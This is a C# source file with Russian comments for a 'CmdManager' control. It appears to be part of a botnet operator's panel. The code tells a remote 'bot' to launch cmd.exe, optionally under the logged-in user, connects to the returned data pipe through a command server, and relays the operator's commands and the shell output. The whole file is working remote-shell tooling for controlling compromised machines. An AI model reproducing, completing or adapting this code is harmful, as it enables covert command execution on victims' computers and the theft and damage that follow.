using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace CmdManager
{
	public partial class ControlCmd : UserControl, IControlPage
	{
		public delegate void DelegateInited(string namePipe, uint idStream, Socket sc);
		public delegate void DelegatePrintOutput(string s);
		public delegate void DelegateSetError(string msg);

		Server.IdUid bot;
		string namePipe;
		uint idStream; //ид потока по которому приходят данные
		public DelegateInited funcInited;
		public DelegatePrintOutput funcPrintOutput;
		public DelegateSetError funcSetError;
		Thread threadStarter;
		Thread threadCmdOutputer;
		CmdOutputer cmdOutputer;
		internal bool user; //true запускать под главным юзером

		unsafe struct Msg
		{
			public UInt32 cmd; //ид сообщения
			public fixed byte answer[32]; //какому каналу возвращать ответ
			public UInt32 func; //которой нужно передать ответ
			public UInt32 tag; //значение которое возвращается для func, для запросов с ответами иногда нужно передать дополнительный параметр здесь его и передаем
			public Int32 sz_data; //длина данных, идущих с сообщением
		};


		public ControlCmd(Server.IdUid bot, bool user)
		{
			InitializeComponent();
			this.bot = bot;
			funcInited = new DelegateInited(Inited);
			funcPrintOutput = new DelegatePrintOutput(PrintOutput);
			funcSetError = new DelegateSetError(SetError);
			this.user = user;
		}

		public void Start()
		{
			cmdPrompt.AddMessage("Ждите, идет запуск и настройка cmd.exe\n");
			StarterCmd starter = new StarterCmd(this, bot);
			threadStarter = new Thread(starter.Execute);
			threadStarter.Start();
		}

		public void Stop()
		{
			SendInput("exit\r\n");
			if (threadStarter != null)
			{
				threadStarter.Abort();
				threadStarter = null;
			}
			if (cmdOutputer != null)
			{
				cmdOutputer.Stop();
				threadStarter = null;
			}
		}

		void Inited(string namePipe, uint idStream, Socket sc)
		{
			threadStarter = null;
			this.namePipe = namePipe;
			this.idStream = idStream;
			cmdOutputer = new CmdOutputer(this, sc);
			threadCmdOutputer = new Thread(cmdOutputer.Execute);
			threadCmdOutputer.Start();
			btStart.Enabled = false;
			btStop.Enabled = true;
		}

		void PrintOutput(string s)
		{
			cmdPrompt.AddMessage(s);
		}

		void SetError(string msg)
		{
			cmdPrompt.AddMessage( "\nОШИБКА: " + msg + '\n');
			Stop();
			btStart.Enabled = true;
			btStop.Enabled = false;
		}

		void SendInput(string s)
		{
			Msg msg = new Msg();
			msg.cmd = 1;
			msg.sz_data = s.Length;
			byte[] s2 = Encoding.GetEncoding(866).GetBytes(s);
			int sz_msg = Marshal.SizeOf(msg);
			byte[] data_msg = new byte[sz_msg];
			GCHandle handle = GCHandle.Alloc(data_msg, GCHandleType.Pinned);
			Marshal.StructureToPtr(msg, handle.AddrOfPinnedObject(), false);
			handle.Free();
			int sz = 2 /*размер сообщения*/+ sz_msg + msg.sz_data + 4 /*ID_STREAM_CLOSE, на случай ошибки*/ + 4 /*ид потока*/ + 2 /*размер данных для команды*/;
			byte[] data = new byte[sz];
			int i = 0;
			Array.Copy(BitConverter.GetBytes(sz_msg + msg.sz_data), 0, data, i, 2); i += 2;
			Array.Copy(data_msg, 0, data, i, sz_msg); i += sz_msg;
			Array.Copy(s2, 0, data, i, s.Length); i += s.Length;
			Array.Copy(BitConverter.GetBytes((uint)55), 0, data, i, 4); i += 4; //ID_STREAM_CLOSE
			Array.Copy(BitConverter.GetBytes((uint)idStream), 0, data, i, 4); i += 4;
			Array.Copy(BitConverter.GetBytes((ushort)0), 0, data, i, 2); i += 2;

			bot.server.CM_PutPipeData(bot.id, bot.uid, namePipe, data, sz);
		}

		private void cmdPrompt_Command(object sender, CommandEventArgs e)
		{
			string s = e.Command + "\r\n";
			SendInput(s);
			e.Message = string.Empty;
		}

		private void btStop_Click(object sender, EventArgs e)
		{
			Stop();
		}

		private void btStart_Click(object sender, EventArgs e)
		{
			Start();
		}

		class StarterCmd
		{	
			ControlCmd control;
			Server.IdUid bot;

			public StarterCmd(ControlCmd control, Server.IdUid bot)
			{
				this.control = control;
				this.bot = bot;
			}

			public void Execute()
			{
				string err = string.Empty;
				Socket sc = null;
				string namePipe = string.Empty;
				uint idStream = 0;
				while(true)
				{
					string cmd = "cmd";
					if (control.user) cmd += " user";
					if (!bot.server.CM_SendCmd(bot.id, bot.uid, cmd))
					{
						err = "Не удалось отослать команду на включение cmd.exe";
						break;
					}
					Server.StreamPipeInfo[] pipes = null;
					for (int i = 0; i < 10; i++)
					{
						Thread.Sleep(1000);
						pipes = bot.server.CM_GetPipeStreams(bot.id, bot.uid, "cmd");
						if (pipes != null && pipes.Length > 0)
						{
							break;
						}
					}
					if (pipes == null)
					{
						err = "На сервере не появился канал передачи данных от cmd.exe";
						break;
					}
					namePipe = pipes[pipes.Length - 1].namePipe;
					idStream = pipes[pipes.Length - 1].id;
					sc = bot.server.CM_GetStream(bot.id, bot.uid, idStream);
					if (sc == null)
					{
						err = "Не удалось подключиться к каналу передачи данных от cmd.exe";
						break;
					}
					break;
				}
				if (err.Length > 0)
				{
					control.Invoke(control.funcSetError, new object[] { err });
				}
				else
				{
					control.Invoke(control.funcInited, new object[] { namePipe, idStream, sc });
				}
			}
		}

		public class CmdOutputer
		{
			ControlCmd control;
			Socket sc;

			public CmdOutputer(ControlCmd control, Socket sc)
			{
				this.control = control;
				this.sc = sc;
			}

			public void Execute()
			{
				byte[] buf = new byte[1024];
				try
				{
					while (true)
					{
						int count = Server.ReadDataStream(sc, ref buf, 2000);
						if (count == 0) break;
						if (count > 0)
						{
							if (count <= 0) break;
							string s = Encoding.GetEncoding(866).GetString(buf, 0, count);
							control.Invoke(control.funcPrintOutput, new object[] { s });
						}
					}
					sc.Close();
				}
				catch(Exception)
				{
				}
				try
				{
					control.Invoke(control.funcSetError, new object[] { "Связь с cmd.exe потеряна, работа окончена" });
				}
				catch
				{
				}
			}

			public void Stop()
			{
				try
				{
					sc.Close();
				}
				catch
				{
				}
			}

		}

	}
}
